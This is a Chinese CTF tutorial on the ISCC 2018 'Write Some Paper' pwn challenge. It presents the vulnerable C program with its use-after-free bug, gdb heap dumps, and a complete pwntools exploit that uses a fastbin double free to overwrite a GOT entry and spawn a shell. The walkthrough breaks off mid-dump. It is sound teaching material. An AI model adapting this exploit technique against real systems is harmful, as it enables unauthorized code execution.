> 以iscc 2018的Write Some Paper为例进行讲解，不懂的可以看看上一节的内容
>
> 程序来源：[https://github.com/mhzx020/Redirect](https://github.com/mhzx020/Redirect)
>
> 参考资料：[https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/](https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/)
>
> 附件下载：
>
> 链接：[https://pan.baidu.com/s/1pBxc_-8pqJr9MRlA2AvxHQ](https://pan.baidu.com/s/1pBxc_-8pqJr9MRlA2AvxHQ)
>
> 提取码：2onz 
>

> 复制这段内容后打开百度网盘手机App，操作更方便哦
>

---

> 本题使用fastbin_double_free进行攻击，但同时此题存在着UAF漏洞。
>

# 准备工作
系统环境和libc文件版本如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602069611307-cf86842c-3223-4b96-90ad-4074fd30c16a.png)

文件保护如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602069507659-9cdc5c4e-b4b7-45a4-bc60-3591be974b05.png)

# 程序源代码
> 源码来源：[https://github.com/mhzx020/Redirect/blob/master/fastbin_double_free.c](https://github.com/mhzx020/Redirect/blob/master/fastbin_double_free.c)
>

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

char *link_list[10];

void print_menu();
int get_choice();
void add_paper();
void delete_paper();
void secret();
void get_input(char *buffer, int size, int no_should_fill_full);
int get_num();
void gg();

int main()
{
    setvbuf(stdout, 0, 2, 0);
    int choice;
    while (1){
        print_menu();
        choice = get_num();
        switch (choice){
            case 1:
                add_paper();
                break;
            case 2:
                delete_paper();
                break;
            case 3:
                secret();
            default:
                break;
        }
    }
    printf("thank you\n");
}

void gg()
{
    system("/bin/sh\x00");
}

void secret()
{
    long luck_num;
    printf("enter your luck number:");
    scanf("%ld", &luck_num);
    puts("Maybe you want continue manage paper?");
    int choice;
    while (1){
        print_menu();
        choice = get_num();
        switch (choice){
            case 1:
                add_paper();
                break;
            case 2:
                delete_paper();
                break;
            default:
                return;
        }
    }
    printf("thank you!");
}

void delete_paper()
{
    int index;
    printf("which paper you want to delete,please enter it's index(0-9):");
    scanf("%d", &index);
    if (index < 0 || index > 9)
        exit(1);
    free(link_list[index]);
    puts("delete success !");
}

void add_paper()
{
    int index;
    int length;
    printf("Input the index you want to store(0-9):");
    scanf("%d", &index);
    if (index < 0 || index > 9)
        exit(1);
    printf("How long you will enter:");
    scanf("%d", &length);
    if (length < 0 || length > 1024)
        exit(1);
    link_list[index] = malloc(length);
    if (link_list[index] == NULL)
        exit(1);
    printf("please enter your content:");
    get_input(link_list[index], length, 1);
    printf("add success!\n");
}

void print_menu()
{
    puts("Welcome to use the paper management system!");
    puts("1 add paper");
    puts("2 delete paper");
}

void get_input(char *buffer, int size, int no_should_fill_full)
{
    int index = 0;
    char *current_location;
    int current_input_size;
    while (1){
        current_location = buffer+index;
        current_input_size = fread(buffer+index, 1, 1, stdin);
        if (current_input_size <= 0)
            break;
        if (*current_location == '\n' && no_should_fill_full){
            if (index){
                *current_location = 0;
                return;
            }        
        }else{
            index++;
            if (index >= size)
                break;
        }
    }
}

int get_num()
{
    int result;
    char input[48];
    char *end_ptr;
    
    get_input(input, 48, 1);
    result = strtol(input, &end_ptr, 0);
    if (input == end_ptr){
        printf("%s input is not start with number!\n", input);
        result = get_num();
    }
    return result;
}
```

# IDA静态分析
> 使用IDA打开可执行文件，然后查看一下伪代码
>
> 有的函数需要修改类型为void
>

## main函数
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602069741284-3b602bf1-91a7-4430-87b7-7206d55d1f75.png)

## print_menu函数
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602069798986-98fa40ba-e4ac-47a2-b078-911560428783.png)

程序功能界面函数，不多说。

## get_num函数
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602070063449-ea6542fe-7422-4b21-ab1b-2e0416fe2a50.png)

主要是用来程序功能的选择。

## 1、add_paper函数
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602070254198-2235ac90-1938-4e30-8875-ce1af92de8cd.png)

这是增加paper的函数，值得注意的是申请的堆指针是存放在link_list数组中的，数组的起始地址为0x6020C0

## 2、delete_paper
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602070566160-cdf66d76-3947-4280-a485-04db75dc39e7.png)

这里在free堆块的内容之后，并没有将对应的link_list[delete_index]置空（link_list[delete_index]=NULL），因此这里存在UAF漏洞。

## 3、secret
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602070738079-24d10f86-f8dd-4572-ad25-d43c17c697ba.png)

隐藏的功能函数，在菜单界面上没有显示出来，其实和前面的函数功能都一样，不说了。

# 了解程序的内存分布
> 调试一下以熟悉程序的内存分布
>

## 添加两个paper
+ chunk0：index=0；length=20；content=paper1
+ chunk1：index=1；length=25；content=paper2

gdb信息如下：

```powershell
➜  fastbin_double_free sudo gdb paper
[sudo] password for ubuntu: 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 187 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from paper...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/fastbin_attack/fastbin_double_free/paper 
Welcome to use the paper management system!
1 add paper
2 delete paper
1
Input the index you want to store(0-9):0
How long you will enter:20
please enter your content:paper1
add success!
Welcome to use the paper management system!
1 add paper
2 delete paper
1
Input the index you want to store(0-9):1
How long you will enter:25
please enter your content:paper2
add success!
Welcome to use the paper management system!
1 add paper
2 delete paper
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x400
 RDI  0x0
 RSI  0x603010 ◂— 0xa327265706170 /* 'paper2\n' */
 R8   0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ffff7fdd700 ◂— 0x7ffff7fdd700
 R10  0x7ffff7fdd700 ◂— 0x7ffff7fdd700
 R11  0x246
 R12  0x1
 R13  0x1
 R14  0x7fffffffe4d0 —▸ 0x7fffffffe620 ◂— 0x1
 R15  0x0
 RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RSP  0x7fffffffe408 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7fffffffe408 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
01:0008│      0x7fffffffe410 —▸ 0x7fffffffe520 —▸ 0x7fffffffe540 —▸ 0x400c80 (__libc_csu_init) ◂— push   r15
02:0010│      0x7fffffffe418 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
03:0018│      0x7fffffffe420 ◂— 0x0
04:0020│      0x7fffffffe428 —▸ 0x7ffff7a86068 (__GI__IO_file_xsgetn+408) ◂— cmp    eax, -1
05:0028│      0x7fffffffe430 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
06:0030│      0x7fffffffe438 ◂— 0x1
... ↓
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1     7ffff7a875f8 _IO_file_underflow+328
   f 2     7ffff7a86068 __GI__IO_file_xsgetn+408
   f 3     7ffff7a7b246 fread+150
   f 4           400ba7 get_input+81
   f 5           400c14 get_num+46
   f 6           400907 main+58
   f 7     7ffff7a2d840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

看一下堆和bin的情况：

```powershell
pwndbg> heap
Allocated chunk
Addr: 0x603000
Size: 0xa327265706170  #请忽略这条信息，heap的显示有问题

pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

看一下堆内存：

```powershell
pwndbg> x/150gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000411 #buffer_zone（程序申请的缓冲区）
0x603010:	0x000a327265706170	0x0000000000000000
          #paper2.
0x603020:	0x0000000000000000	0x0000000000000000
......(省略内容均为空)
0x603410:	0x0000000000000000	0x0000000000000021 #chunk0
0x603420:	0x0000317265706170	0x0000000000000000
          #paper1
0x603430:	0x0000000000000000	0x0000000000000031 #chunk1
0x603440:	0x0000327265706170	0x0000000000000000
          #paper2
0x603450:	0x0000000000000000	0x0000000000000000
0x603460:	0x0000000000000000	0x0000000000020ba1 #top_chunk
......(省略内容均为空)
0x6034a0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

## 删除paper1
接下来删除刚刚申请的paper1（index=0，chunk0）：

```powershell
pwndbg> c
Continuing.
2
which paper you want to delete,please enter it's index(0-9):0
delete success !
Welcome to use the paper management system!
1 add paper
2 delete paper
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x400
 RDI  0x0
 RSI  0x603010 ◂— 0xa327265700a30 /* '0\nper2\n' */
 R8   0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ffff7fdd700 ◂— 0x7ffff7fdd700
 R10  0x7ffff7fdd700 ◂— 0x7ffff7fdd700
 R11  0x246
 R12  0x1
 R13  0x1
 R14  0x7fffffffe4d0 —▸ 0x7fffffffe60a ◂— 0xe618000000000040 /* '@' */
 R15  0x0
 RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RSP  0x7fffffffe408 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7fffffffe408 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
01:0008│      0x7fffffffe410 ◂— 0x0
02:0010│      0x7fffffffe418 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
03:0018│      0x7fffffffe420 ◂— 0x0
04:0020│      0x7fffffffe428 —▸ 0x7ffff7a86068 (__GI__IO_file_xsgetn+408) ◂— cmp    eax, -1
05:0028│      0x7fffffffe430 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
06:0030│      0x7fffffffe438 ◂— 0x1
... ↓
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1     7ffff7a875f8 _IO_file_underflow+328
   f 2     7ffff7a86068 __GI__IO_file_xsgetn+408
   f 3     7ffff7a7b246 fread+150
   f 4           400ba7 get_input+81
   f 5           400c14 get_num+46
   f 6           400907 main+58
   f 7     7ffff7a2d840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────
pwndbg> heap
Allocated chunk
Addr: 0x603000
Size: 0xa327265700a30

pwndbg> x/150gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000411 #buffer_zone
0x603010:	0x000a327265700a30	0x0000000000000000
......(省略内容均为空)
0x603410:	0x0000000000000000	0x0000000000000021 #chunk0(free)
0x603420:	0x0000000000000000	0x0000000000000000
0x603430:	0x0000000000000000	0x0000000000000031 #chunk1
0x603440:	0x0000327265706170	0x0000000000000000
0x603450:	0x0000000000000000	0x0000000000000000
0x603460:	0x0000000000000000	0x0000000000020ba1 #top_chunk 
......(省略内容均为空)
0x6034a0:	0x0000000000000000	0x0000000000000000
pwndbg> bin                          
fastbins
0x20: 0x603410 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000603410 #chunk0
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000603460 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> 
```

可以看到，chunk0被释放到了fastbin这个单链表中。

## 删除paper2
接下来释放chunk1（index=1，chunk1），内存信息如下：

```powershell
pwndbg> c
Continuing.
2 
which paper you want to delete,please enter it's index(0-9):1
delete success !
Welcome to use the paper management system!
1 add paper
2 delete paper
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x400
 RDI  0x0
 RSI  0x603010 ◂— 0xa327265700a31 /* '1\nper2\n' */
 R8   0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ffff7fdd700 ◂— 0x7ffff7fdd700
 R10  0x7ffff7fdd700 ◂— 0x7ffff7fdd700
 R11  0x246
 R12  0x1
 R13  0x1
 R14  0x7fffffffe4d0 —▸ 0x7fffffffe60a ◂— 0xe618000000000040 /* '@' */
 R15  0x0
 RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RSP  0x7fffffffe408 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7fffffffe408 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
01:0008│      0x7fffffffe410 ◂— 0x0
02:0010│      0x7fffffffe418 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
03:0018│      0x7fffffffe420 ◂— 0x0
04:0020│      0x7fffffffe428 —▸ 0x7ffff7a86068 (__GI__IO_file_xsgetn+408) ◂— cmp    eax, -1
05:0028│      0x7fffffffe430 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
06:0030│      0x7fffffffe438 ◂— 0x1
... ↓
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1     7ffff7a875f8 _IO_file_underflow+328
   f 2     7ffff7a86068 __GI__IO_file_xsgetn+408
   f 3     7ffff7a7b246 fread+150
   f 4           400ba7 get_input+81
   f 5           400c14 get_num+46
   f 6           400907 main+58
   f 7     7ffff7a2d840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────
pwndbg> bin
fastbins
0x20: 0x603410 ◂— 0x0 
0x30: 0x603430 ◂— 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0xa327265700a31

pwndbg> x/150gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000411 #buffer_zone
0x603010:	0x000a327265700a31	0x0000000000000000
......(省略内容均为空)
0x603410:	0x0000000000000000	0x0000000000000021 #chunk0(free)
0x603420:	0x0000000000000000	0x0000000000000000
0x603430:	0x0000000000000000	0x0000000000000031 #chunk1(free)
0x603440:	0x0000000000000000	0x0000000000000000
0x603450:	0x0000000000000000	0x0000000000000000
0x603460:	0x0000000000000000	0x0000000000020ba1 #top_chunk
......(省略内容均为空)
0x6034a0:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000603410 #chunk0
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000603430	0x0000000000000000 #chunk1
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000603460 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> 
```

由于之前创建的两个堆块大小并不相同，因此在释放的时候并没有回收到fastbin的同一条链表中。

由于程序存在UAF漏洞，在chunk被释放后指针并没有被置空，因此程序存放的结构体指针如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602474056502-3abb29a4-d69a-409d-bb67-b5a2e003111c.png)

# 控制程序的流程并getshell
为了解说方便，先贴上exp，大致了解一下流程：

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')

myelf = ELF("./paper")
io = process(myelf.path)

def add_paper(num, index, content):
    io.recv()
    io.sendline("1")
    io.recv()
    io.sendline(str(index))
    io.recv()
    io.sendline(str(num))
    io.recv()
    io.sendline(content)

def del_paper(index):
    io.recv()
    io.sendline("2")
    io.recv()
    io.sendline(str(index))

add_paper(0x30, 1, "1") 
add_paper(0x30, 2, "1")

del_paper(1)
del_paper(2)
del_paper(1)

add_paper(0x30, 1, p64(0x60202a)) #chunk1
add_paper(0x30, 1, "1")
add_paper(0x30, 1, "1")
add_paper(0x30, 1, "\x40\x00\x00\x00\x00\x00"+p64(myelf.symbols["gg"])) #0x60202a_chunk


io.recv()
io.sendline("a")
io.interactive()
```

## 模仿程序的功能
```python
def add_paper(num, index, content):
    io.recv()
    io.sendline("1")
    io.recv()
    io.sendline(str(index))
    io.recv()
    io.sendline(str(num))
    io.recv()
    io.sendline(content)

def del_paper(index):
    io.recv()
    io.sendline("2")
    io.recv()
    io.sendline(str(index))
```

这个是模仿程序的输入，这个就不多说了。

## 创建两个堆块
```python
add_paper(0x30, 1, "1") #48
add_paper(0x30, 2, "1")
```

这里创建了两个堆块，这里称之为chunk1和chunk2。在内存中的分布大致是这样子的：

```powershell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x402000 r-xp     2000 0      /home/ubuntu/Desktop/fastbin_attack/fastbin_double_free/paper
          0x601000           0x602000 r--p     1000 1000   /home/ubuntu/Desktop/fastbin_attack/fastbin_double_free/paper
          0x602000           0x603000 rw-p     1000 2000   /home/ubuntu/Desktop/fastbin_attack/fastbin_double_free/paper
          0xc79000           0xc9b000 rw-p    22000 0      [heap]
    0x7f5596a5c000     0x7f5596c1c000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f5596c1c000     0x7f5596e1c000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f5596e1c000     0x7f5596e20000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f5596e20000     0x7f5596e22000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f5596e22000     0x7f5596e26000 rw-p     4000 0      
    0x7f5596e26000     0x7f5596e4c000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7f5597030000     0x7f5597033000 rw-p     3000 0      
    0x7f559704b000     0x7f559704c000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7f559704c000     0x7f559704d000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7f559704d000     0x7f559704e000 rw-p     1000 0      
    0x7ffc20271000     0x7ffc20292000 rw-p    21000 0      [stack]
    0x7ffc20308000     0x7ffc2030b000 r--p     3000 0      [vvar]
    0x7ffc2030b000     0x7ffc2030d000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> 
```

> 注意：这两个chunk的index分别为index1和index2。
>
> pwntools运行exp时会将堆块的地址进行随机化，并且申请的缓冲区大小与程序运行时的大小并不相同，这里以pwntools运行exp时的内存状况来说明。
>

使用exp附加gdb进行动态调试：gdb.attach(io)

```powershell
pwndbg: loaded 187 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from /home/ubuntu/Desktop/fastbin_attack/fastbin_double_free/paper...(no debugging symbols found)...done.
Attaching to program: /home/ubuntu/Desktop/fastbin_attack/fastbin_double_free/paper, process 20385
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.23.so...done.
done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.23.so...done.
done.
0x00007f5596b53320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x7f5596e208e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RCX  0x7f5596b53320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x1000
 RDI  0x0
 RSI  0xc79010 ◂— 0xa0a31 /* '1\n\n' */
 R8   0x7f5596e22790 (_IO_stdfile_0_lock) ◂— 0x100000001
 R9   0x7ffc2028fb30 —▸ 0x7ffc2028fc80 ◂— 0x1
 R10  0x7f5597031700 ◂— 0x7f5597031700
 R11  0x246
 R12  0x1
 R13  0x1
 R14  0x7ffc2028fb30 —▸ 0x7ffc2028fc80 ◂— 0x1
 R15  0x0
 RBP  0x0
 RSP  0x7ffc2028fa68 —▸ 0x7f5596ad65f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
 RIP  0x7f5596b53320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7f5596b53320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7f5596b53326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7f5596b53359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7f5596b53360 <read+80>               neg    eax
   0x7f5596b53362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7f5596b53365 <read+85>               or     rax, 0xffffffffffffffff
   0x7f5596b53369 <read+89>               ret    
 
   0x7f5596b5336a                         nop    word ptr [rax + rax]
   0x7f5596b53370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7f5596e25740>
   0x7f5596b53377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7f5596b53389 <write+25>              sub    rsp, 8
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7ffc2028fa68 —▸ 0x7f5596ad65f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
01:0008│      0x7ffc2028fa70 —▸ 0x7ffc2028fb80 —▸ 0x7ffc2028fba0 —▸ 0x400c80 (__libc_csu_init) ◂— push   r15
02:0010│      0x7ffc2028fa78 —▸ 0x7f5596e208e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
03:0018│      0x7ffc2028fa80 ◂— 0x0
04:0020│      0x7ffc2028fa88 —▸ 0x7f5596ad5068 (__GI__IO_file_xsgetn+408) ◂— cmp    eax, -1
05:0028│      0x7ffc2028fa90 —▸ 0x7f5596e208e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
06:0030│      0x7ffc2028fa98 ◂— 0x1
... ↓
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0     7f5596b53320 __read_nocancel+7
   f 1     7f5596ad65f8 _IO_file_underflow+328
   f 2     7f5596ad5068 __GI__IO_file_xsgetn+408
   f 3     7f5596aca246 fread+150
   f 4           400ba7 get_input+81
   f 5           400c14 get_num+46
   f 6           400907 main+58
   f 7     7f5596a7c840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0xc79000
Size: 0xa0a31

pwndbg> x/1000gx 0xc79000
0xc79000:	0x0000000000000000	0x0000000000001011
0xc79010:	0x00000000000a0a31	0x0000000000000000
0xc79020:	0x0000000000000000	0x0000000000000000
......(省略内容均为空)
0xc7a010:	0x0000000000000000	0x0000000000000041 #chunk1
0xc7a020:	0x0000000000000031	0x0000000000000000
0xc7a030:	0x0000000000000000	0x0000000000000000
0xc7a040:	0x0000000000000000	0x0000000000000000
0xc7a050:	0x0000000000000000	0x0000000000000041 #chunk2
0xc7a060:	0x0000000000000031	0x0000000000000000
0xc7a070:	0x0000000000000000	0x0000000000000000
0xc7a080:	0x0000000000000000	0x0000000000000000
0xc7a090:	0x0000000000000000	0x0000000000020f71 #top_chunk
......(省略内容均为空)
0xc7af30:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx &main_arena
0x7f5596e20b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7f5596e20b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7f5596e20b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7f5596e20b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
